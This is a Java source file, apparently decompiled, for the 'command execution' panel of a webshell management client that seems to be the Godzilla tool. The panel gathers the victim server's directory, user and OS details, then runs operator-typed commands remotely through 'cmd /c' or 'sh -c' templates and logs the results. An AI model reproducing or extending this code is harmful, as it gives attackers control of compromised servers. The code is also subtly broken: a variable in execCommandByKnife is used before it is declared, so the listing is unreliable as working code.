package core.ui.component;

import core.ApplicationContext;
import core.Db;
import core.annotation.DisplayName;
import core.imp.Payload;
import core.shell.ShellEntity;
import core.ui.component.dialog.GOptionPane;
import core.ui.component.menu.ShellPopMenu;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.awt.event.FocusAdapter;
import java.awt.event.FocusEvent;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.JToolBar;
import javax.swing.UIDefaults;
import javax.swing.text.BadLocationException;
import javax.swing.text.Document;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;


@DisplayName(DisplayName = "命令执行")
public class ShellExecCommandPanel
  extends JPanel
{
  private static final String SUPER_WIN_COMMAND = "cd /d \"{currentDir}\"&{command}&echo {startStr}&cd&echo {endStr}";
  private static final String SUPER_LINUX_COMMAND = "cd \"{currentDir}\";{command};echo {startStr};pwd;echo {endStr}";
  private static final String WINDOWS_COMMAND = "cmd /c \"{command}\" 2>&1";
  private static final String LINUX_COMMAND = "sh -c \"{command}\" 2>&1";
  private static final String ENV_COMMAND_KEY = "ENV_ShellExecCommandPanel_Command_KEY";
  public static final String EXEC_COMMAND_MODE_KEY = "EXEC_COMMAND_MODE";
  private ArrayList<String> last_commands = new ArrayList<>(); private int command_start; private int command_stop; private JToolBar bar; private JLabel status; private JTextPane console; private JScrollPane console_scroll; private Document shell_doc;
  private int num = 1; private Payload shell;
  private ShellEntity shellContext;
  private String currentDir;
  private String currentUser;
  private String fileRoot;
  private String osInfo;
  private ShellPopMenu shellPopMenu;
  private JLabel commandFormatLabel;
  private JTextField commandFormatTextField;
  private JButton saveConfigButton;
  private File commandLogFile;
  
  public ShellExecCommandPanel(ShellEntity shellEntity) {
    super(new BorderLayout());
    
    this.shell = shellEntity.getPayloadModule();
    this.shellContext = shellEntity;
    this.bar = new JToolBar();
    this.status = new JLabel("完成");
    this.bar.setFloatable(false);
    this.console = new JTextPane();
    this.console_scroll = new JScrollPane(this.console);
    this.commandFormatLabel = new JLabel("命令模板");
    this.saveConfigButton = new JButton("保存配置");
    this.commandFormatTextField = new JTextField(getDefaultOsFormatCommand());

    
    this.shell_doc = this.console.getDocument();
    
    this.shellPopMenu = new ShellPopMenu(this, this.console);
    this.currentDir = this.shell.currentDir();
    this.currentUser = this.shell.currentUserName();
    this.fileRoot = Arrays.toString((Object[])shellEntity.getPayloadModule().listFileRoot());
    this.osInfo = this.shell.getOsInfo();
    this.commandLogFile = new File(String.format("%s/%s/command.log", new Object[] { "GodzillaCache", shellEntity.getId() }));



    
    this.status.setText("正在连接...请稍等");
    try {
      this.shell_doc.insertString(this.shell_doc.getLength(), String.format("currentDir:%s\nfileRoot:%s\ncurrentUser:%s\nosInfo:%s\n", new Object[] { this.currentDir, this.fileRoot, this.currentUser, this.osInfo }), null);
      if (shellEntity.isUseCache()) {
        this.shell_doc.insertString(this.shell_doc.getLength(), "\n", null);
        this.shell_doc.insertString(this.shell_doc.getLength(), functions.readFileBottomLine(this.commandLogFile, 2000), null);
      } 
      this.shell_doc.insertString(this.shell_doc.getLength(), "\n" + this.currentDir + " >", null);
    } catch (BadLocationException e) {
      Log.error(e);
    } 
    this.command_start = this.shell_doc.getLength();
    this.console.setCaretPosition(this.shell_doc.getLength());
    this.status.setText("完成");


    
    GBC gbcinfo = (new GBC(0, 0, 6, 1)).setFill(2).setWeight(100.0D, 0.0D);
    GBC gbcconsole = (new GBC(0, 1, 6, 1)).setFill(1).setWeight(0.0D, 10.0D);
    GBC gbcbar = (new GBC(0, 2, 6, 1)).setFill(2).setWeight(100.0D, 0.0D);


    
    textareaFocus f_listener = new textareaFocus();
    addFocusListener(f_listener);

    
    textareaKey key_listener = new textareaKey();
    this.console.addKeyListener(key_listener);

    
    this.bar.add(this.status);
    
    JSplitPane splitPane = new JSplitPane(0);
    
    JPanel topPanel = new JPanel();


    
    this.commandFormatTextField.setColumns(100);

    
    topPanel.add(this.commandFormatLabel);
    topPanel.add(this.commandFormatTextField);
    
    topPanel.add(this.saveConfigButton);
    
    JPanel bottomPanel = new JPanel();
    
    bottomPanel.setLayout(new GridBagLayout());
    
    bottomPanel.add(this.bar, gbcinfo);
    bottomPanel.add(this.console_scroll, gbcconsole);
    bottomPanel.add(this.bar, gbcbar);

    
    splitPane.setTopComponent(topPanel);
    splitPane.setBottomComponent(bottomPanel);
    
    add(splitPane);


    
    this.console.setCaretPosition(this.shell_doc.getLength());
    
    Color bgColor = Color.BLACK;
    UIDefaults defaults = new UIDefaults();
    defaults.put("TextPane[Enabled].backgroundPainter", bgColor);
    this.console.putClientProperty("Nimbus.Overrides", defaults);
    this.console.putClientProperty("Nimbus.Overrides.InheritDefaults", Boolean.valueOf(true));
    this.console.setBackground(bgColor);
    
    this.console.setForeground(Color.green);
    this.console.setBackground(Color.black);
    this.console.setCaretColor(Color.white);
    
    this.command_start = this.shell_doc.getLength();
    automaticBindClick.bindJButtonClick(this, this);
  }

  
  private class textareaFocus
    extends FocusAdapter
  {
    private textareaFocus() {}

    
    public void focusGained(FocusEvent e) {
      ShellExecCommandPanel.this.console.requestFocus();
      ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.shell_doc.getLength());
    }
  }
  
  private class textareaKey
    extends KeyAdapter
  {
    private textareaKey() {}
    
    public void keyPressed(KeyEvent arg0) {
      if (ShellExecCommandPanel.this.shell_doc.getLength() <= ShellExecCommandPanel.this.command_start && !arg0.isControlDown() && 
        arg0.getKeyCode() == 8) {
        try {
          String t = ShellExecCommandPanel.this.shell_doc.getText(ShellExecCommandPanel.this.console.getCaretPosition() - 1, 1);
          ShellExecCommandPanel.this.shell_doc.insertString(ShellExecCommandPanel.this.console.getCaretPosition(), t, null);
        } catch (Exception exception) {}
      }



      
      if ((ShellExecCommandPanel.this.console.getCaretPosition() < ShellExecCommandPanel.this.command_start || ShellExecCommandPanel.this.console.getSelectionStart() < ShellExecCommandPanel.this.command_start || ShellExecCommandPanel.this
        .console.getSelectionEnd() < ShellExecCommandPanel.this.command_start) && !arg0.isControlDown())
      { ShellExecCommandPanel.this.console.setEditable(false);
        ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.shell_doc.getLength()); }
      else { ShellExecCommandPanel.this.console.setEditable((!arg0.isControlDown() || ShellExecCommandPanel.this.console.getCaretPosition() >= ShellExecCommandPanel.this.command_start)); }
      
      if (arg0.getKeyCode() == 10) {
        ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.shell_doc.getLength());
      }
    }


    
    public synchronized void keyReleased(KeyEvent arg0) {
      ShellExecCommandPanel.this.command_stop = ShellExecCommandPanel.this.shell_doc.getLength();
      if (arg0.getKeyCode() == 10) {
        String tmp_cmd = null;
        try {
          tmp_cmd = ShellExecCommandPanel.this.shell_doc.getText(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.command_stop - ShellExecCommandPanel.this.command_start);



          
          tmp_cmd = tmp_cmd.replace("\n", "").replace("\r", "");
          if (tmp_cmd.equals("cls") || tmp_cmd.equals("clear")) {
            ShellExecCommandPanel.this.shell_doc.remove(0, ShellExecCommandPanel.this.shell_doc.getLength());
            ShellExecCommandPanel.this.shell_doc.insertString(0, "\n" + ShellExecCommandPanel.this.currentDir + " >", null);
            ShellExecCommandPanel.this.command_start = ShellExecCommandPanel.this.shell_doc.getLength();
          }
          else {
            
            ShellExecCommandPanel.this.status.setText("正在执行...请稍等");
            
            try {
              ShellExecCommandPanel.this.execute(ShellExecCommandPanel.this.shell_doc.getText(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.command_stop - ShellExecCommandPanel.this.command_start));
            } catch (Exception e) {
              
              ShellExecCommandPanel.this.status.setText("执行失败");
              
              ShellExecCommandPanel.this.console.setEditable(true);
            } 
          } 
          if (tmp_cmd.trim().length() > 0) {
            ShellExecCommandPanel.this.last_commands.add(tmp_cmd);
          }
          ShellExecCommandPanel.this.num = ShellExecCommandPanel.this.last_commands.size();
        } catch (BadLocationException e) {
          
          e.printStackTrace();
        } 
      } 

      
      if (arg0.getKeyCode() == 38) {
        ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.command_start);
        try {
          ShellExecCommandPanel.this.shell_doc.remove(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.shell_doc.getLength() - ShellExecCommandPanel.this.command_start);
          ShellExecCommandPanel.this.shell_doc.insertString(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.key_up_action(), null);
        } catch (BadLocationException e) {
          
          e.printStackTrace();
        } 
      } 


      
      if (arg0.getKeyCode() == 40) {
        ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.command_start);
        try {
          ShellExecCommandPanel.this.shell_doc.remove(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.shell_doc.getLength() - ShellExecCommandPanel.this.command_start);
          ShellExecCommandPanel.this.shell_doc.insertString(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.key_down_action(), null);
        } catch (BadLocationException e) {
          
          e.printStackTrace();
        } 
      } 
    }
  }



  
  public void execute(String command) {
    StringBuilder logBuffer = new StringBuilder();
    logBuffer.append(this.currentDir + " >" + command);
    logBuffer.append("\n");
    String result = "";
    try {
      command = command.trim();
      if (command.length() > 0) {
        result = result + execCommand(command);
      } else {
        result = result + "NULL";
      } 
      result = result.trim();
      this.shell_doc.insertString(this.shell_doc.getLength(), "\n", null);
      this.shell_doc.insertString(this.shell_doc.getLength(), result, null);
      
      this.shell_doc.insertString(this.shell_doc.getLength(), "\n" + this.currentDir + " >", null);
      this.command_start = this.shell_doc.getLength();
      this.console.setCaretPosition(this.shell_doc.getLength());
      this.status.setText("完成");
    }
    catch (Exception e) {
      try {
        this.shell_doc.insertString(this.shell_doc.getLength(), "\nNull", null);
        
        this.shell_doc.insertString(this.shell_doc.getLength(), "\n" + this.currentDir + " >", null);
        this.command_start = this.shell_doc.getLength();
        this.console.setCaretPosition(this.shell_doc.getLength());
      } catch (Exception e2) {
        Log.error(e2);
      } 
    } 
    logBuffer.append(result);
    logBuffer.append("\n");
    if (!this.shellContext.isUseCache() && ApplicationContext.isOpenCache()) {
      functions.appendFile(this.commandLogFile, logBuffer.toString().getBytes());
    }
  }

  
  public String key_up_action() {
    this.num--;
    String last_command = null;
    if (this.num >= 0 && !this.last_commands.isEmpty()) {
      last_command = this.last_commands.get(this.num);
      last_command = last_command.replace("\n", "").replace("\r", "");
      return last_command;
    } 
    return "";
  }



  
  public String key_down_action() {
    this.num++;
    String last_command = null;
    if (this.num < this.last_commands.size() && this.num >= 0) {
      last_command = this.last_commands.get(this.num);
      last_command = last_command.replace("\n", "").replace("\r", "");
      return last_command;
    }  if (this.num < 0) {
      this.num = 0;
      return "";
    } 
    this.num = this.last_commands.size();
    return "";
  }

  
  public void saveConfigButtonClick(ActionEvent e) {
    this.shellContext.setEnv("ENV_ShellExecCommandPanel_Command_KEY", this.commandFormatTextField.getText());
    GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "保存成功", "提示", 1);
  }

  
  public String execCommand(String command) {
    switch (Db.getSetingValue("EXEC_COMMAND_MODE", "EASY").toUpperCase()) {
      case "EASY":
        return execEasyCommand(command);
      case "KNIFE":
        return execCommandByKnife(command);
    } 
    return execCommandEx(command);
  }


  
  private String execCommandByKnife(String command) {
    String start = String.format("[%s]", new Object[] { functions.getRandomString(5) });
    String end = String.format("[%s]", new Object[] { functions.getRandomString(5) });
    
    if (!this.shell.isWindows()) {
      superCommandFormat = "cd \"{currentDir}\";{command};echo {startStr};pwd;echo {endStr}";
    } else {
      superCommandFormat = "cd /d \"{currentDir}\"&{command}&echo {startStr}&cd&echo {endStr}";
    } 
    String superCommandFormat = superCommandFormat.replace("{currentDir}", this.currentDir).replace("{command}", command).replace("{startStr}", start).replace("{endStr}", end);

    
    String result = execCommandEx(superCommandFormat);
    if (result != null && result.trim().length() > 0) {
      int index = result.indexOf(start);
      int endIndex = result.indexOf(end);
      StringBuilder builder = new StringBuilder(result);
      
      if (index != -1 && endIndex != -1) {
        builder.delete(index, endIndex + end.length());
        this.currentDir = functions.subMiddleStr(result, start, end).replace("\r", "").replace("\n", "");
        return builder.toString().trim();
      } 
    } 
    return result;
  }
  
  private String execEasyCommand(String command) {
    String[] commands = functions.SplitArgs(command);
    String fileName = commands[0];
    
    String start = functions.getRandomString(5);
    String end = functions.getRandomString(5);
    
    if ("cd".equalsIgnoreCase(fileName) && commands.length > 0) {
      String dir = commands[1].replace("\\", "/");
      String str1 = null;
      if (this.shell.isWindows()) {
        str1 = String.format("cd /d \"%s\"&cd /d \"%s\"&&echo {startStr}&&cd&&echo {endStr}", new Object[] { this.currentDir, dir });
      } else {
        str1 = String.format("cd \"%s\";cd \"%s\"&&echo {startStr}&&pwd&&echo {endStr}", new Object[] { this.currentDir, dir });
      } 
      str1 = str1.replace("{startStr}", start).replace("{endStr}", end);
      String resultDir = execCommandEx(str1).trim();
      if (resultDir.startsWith(start)) {
        resultDir = resultDir.substring(resultDir.indexOf(start) + start.length()).trim();
        if (resultDir.endsWith(end)) {
          resultDir = resultDir.substring(0, resultDir.indexOf(end)).trim();
          this.currentDir = resultDir;
          return resultDir;
        } 
        return resultDir;
      } 
      
      return resultDir;
    } 
    
    String realCmd = null;
    if (this.shell.isWindows()) {
      realCmd = String.format("cd /d \"%s\"&%s", new Object[] { this.currentDir, command });
    } else {
      realCmd = String.format("cd \"%s\";%s", new Object[] { this.currentDir, command });
    } 
    return execCommandEx(realCmd);
  }

  
  public String execCommandEx(String command) {
    String command2 = formatCommandString(command);
    if (ApplicationContext.isOpenC("isSuperLog")) {
      Log.log("mode : %s command : %s", new Object[] { Db.getSetingValue("EXEC_COMMAND_MODE"), command2 });
    }
    return this.shell.execCommand(command2);
  }
  
  public String formatCommandString(String command) {
    return this.commandFormatTextField.getText().replace("{command}", command);
  }
  
  public String getDefaultOsFormatCommand() {
    return this.shellContext.getEnv("ENV_ShellExecCommandPanel_Command_KEY", this.shell.isWindows() ? "cmd /c \"{command}\" 2>&1" : "sh -c \"{command}\" 2>&1");
  }
}
